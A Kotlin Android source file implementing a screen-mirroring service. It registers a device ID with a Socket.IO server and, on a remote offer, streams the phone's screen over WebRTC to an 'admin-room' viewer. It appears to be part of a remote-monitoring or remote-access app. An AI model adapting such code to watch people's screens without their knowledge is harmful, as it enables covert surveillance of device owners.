package com.csk4.app

import android.app.*
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import org.webrtc.*
import java.net.URI

class ScreenMirrorService(private val ctx: Context, private val deviceId: String) {

    private val TAG = "CSK4_SCREEN"
    private var peerConnection: PeerConnection? = null
    private var videoSource: VideoSource? = null
    private var videoTrack: VideoTrack? = null
    private var audioSource: AudioSource? = null
    private var audioTrack: AudioTrack? = null
    private var socket: Socket? = null
    private var factory: PeerConnectionFactory? = null
    private var eglBase: EglBase? = null
    private var surfaceHelper: SurfaceTextureHelper? = null
    private var screenCapturer: ScreenCapturerAndroid? = null
    private var mediaProjection: MediaProjection? = null
    private var isRunning = false

    fun start() {
        if (isRunning) return
        try {
            eglBase = EglBase.create()

            PeerConnectionFactory.initialize(
                PeerConnectionFactory.InitializationOptions.builder(ctx)
                    .setEnableInternalTracer(false)
                    .createInitializationOptions()
            )

            val encoderFactory = DefaultVideoEncoderFactory(eglBase!!.eglBaseContext, true, true)
            val decoderFactory = DefaultVideoDecoderFactory(eglBase!!.eglBaseContext)

            factory = PeerConnectionFactory.builder()
                .setVideoEncoderFactory(encoderFactory)
                .setVideoDecoderFactory(decoderFactory)
                .createPeerConnectionFactory()

            // Setup socket for signaling
            val opts = IO.Options()
            opts.transports = arrayOf("websocket")
            socket = IO.socket(URI.create(Config.SERVER_URL), opts)
            socket?.connect()
            socket?.emit("register-device", deviceId)

            socket?.on("screen-mirror-offer") { args ->
                try {
                    val data = args[0] as JSONObject
                    val signal = data.getJSONObject("signal")
                    handleOffer(signal)
                } catch (e: Exception) {
                    Log.e(TAG, "Offer error: ${e.message}")
                }
            }

            socket?.on("screen-mirror-ice") { args ->
                try {
                    val data = args[0] as JSONObject
                    val c = data.optJSONObject("signal") ?: return@on
                    val ice = IceCandidate(
                        c.optString("sdpMid"),
                        c.optInt("sdpMLineIndex"),
                        c.optString("candidate")
                    )
                    peerConnection?.addIceCandidate(ice)
                } catch (e: Exception) {
                    Log.e(TAG, "ICE error: ${e.message}")
                }
            }

            isRunning = true
            Log.d(TAG, "Screen mirror service started, waiting for offer")
        } catch (e: Exception) {
            Log.e(TAG, "Start fail: ${e.message}")
        }
    }

    fun startScreenCapture(resultCode: Int, data: Intent) {
        try {
            val mpm = ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            mediaProjection = mpm.getMediaProjection(resultCode, data)
            
            if (mediaProjection == null) {
                Log.e(TAG, "MediaProjection is null")
                return
            }

            // Create screen capturer
            screenCapturer = ScreenCapturerAndroid(data, object : MediaProjection.Callback() {
                override fun onStop() {
                    Log.d(TAG, "MediaProjection stopped")
                }
            })

            surfaceHelper = SurfaceTextureHelper.create("ScreenCapture", eglBase!!.eglBaseContext)
            videoSource = factory!!.createVideoSource(false)
            screenCapturer!!.initialize(surfaceHelper, ctx, videoSource!!.capturerObserver)
            
            // Capture screen at 720p, 30fps
            screenCapturer!!.startCapture(1280, 720, 30)
            videoTrack = factory!!.createVideoTrack("screen_video", videoSource)
            videoTrack?.setEnabled(true)

            Log.d(TAG, "✅ Screen capture started")
        } catch (e: Exception) {
            Log.e(TAG, "Screen capture fail: ${e.message}")
        }
    }

    private fun handleOffer(offer: JSONObject) {
        try {
            val iceServers = listOf(
                PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer(),
                PeerConnection.IceServer.builder("stun:stun1.l.google.com:19302").createIceServer()
            )
            val config = PeerConnection.RTCConfiguration(iceServers)
            config.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN

            peerConnection = factory?.createPeerConnection(config, object : PeerConnection.Observer {
                override fun onIceCandidate(candidate: IceCandidate) {
                    try {
                        val c = JSONObject().apply {
                            put("sdpMid", candidate.sdpMid)
                            put("sdpMLineIndex", candidate.sdpMLineIndex)
                            put("candidate", candidate.sdp)
                        }
                        val data = JSONObject().apply {
                            put("target", "admin-room")
                            put("signal", c)
                        }
                        socket?.emit("screen-mirror-ice", data)
                    } catch (_: Exception) {}
                }
                override fun onIceCandidatesRemoved(c: Array<out IceCandidate>?) {}
                override fun onSignalingChange(state: PeerConnection.SignalingState?) {}
                override fun onIceConnectionChange(state: PeerConnection.IceConnectionState?) {
                    Log.d(TAG, "ICE: $state")
                }
                override fun onIceConnectionReceivingChange(p0: Boolean) {}
                override fun onIceGatheringChange(state: PeerConnection.IceGatheringState?) {}
                override fun onAddStream(stream: MediaStream?) {}
                override fun onRemoveStream(stream: MediaStream?) {}
                override fun onDataChannel(channel: DataChannel?) {}
                override fun onRenegotiationNeeded() {}
                override fun onAddTrack(receiver: RtpReceiver?, streams: Array<out MediaStream>?) {}
            })

            val streams = listOf("screen_stream")
            videoTrack?.let { peerConnection?.addTrack(it, streams) }

            val sdp = SessionDescription(SessionDescription.Type.OFFER, offer.getString("sdp"))
            peerConnection?.setRemoteDescription(SimpleSdpObserver(), sdp)

            peerConnection?.createAnswer(object : SimpleSdpObserver() {
                override fun onCreateSuccess(desc: SessionDescription?) {
                    if (desc == null) return
                    peerConnection?.setLocalDescription(SimpleSdpObserver(), desc)
                    try {
                        val signal = JSONObject().apply { put("sdp", desc.description) }
                        val data = JSONObject().apply {
                            put("target", "admin-room")
                            put("signal", signal)
                        }
                        socket?.emit("screen-mirror-answer", data)
                        Log.d(TAG, "✅ Screen mirror answer sent")
                    } catch (_: Exception) {}
                }
            }, MediaConstraints())

        } catch (e: Exception) {
            Log.e(TAG, "handleOffer fail: ${e.message}")
        }
    }

    fun stop() {
        isRunning = false
        try {
            screenCapturer?.stopCapture()
            screenCapturer?.dispose()
            videoSource?.dispose()
            videoTrack?.dispose()
            audioSource?.dispose()
            audioTrack?.dispose()
            peerConnection?.close()
            peerConnection?.dispose()
            mediaProjection?.stop()
            factory?.dispose()
            surfaceHelper?.dispose()
            socket?.disconnect()
            socket?.off()
            eglBase?.release()
        } catch (e: Exception) {
            Log.e(TAG, "Stop err: ${e.message}")
        } finally {
            peerConnection = null
            factory = null
            socket = null
            videoSource = null
            videoTrack = null
            screenCapturer = null
            mediaProjection = null
            surfaceHelper = null
            eglBase = null
        }
    }

    companion object {
        // Static reference for permission handling
        var instance: ScreenMirrorService? = null
        var pendingResultCode: Int = 0
        var pendingData: Intent? = null

        fun isStarting() = instance != null
    }
}
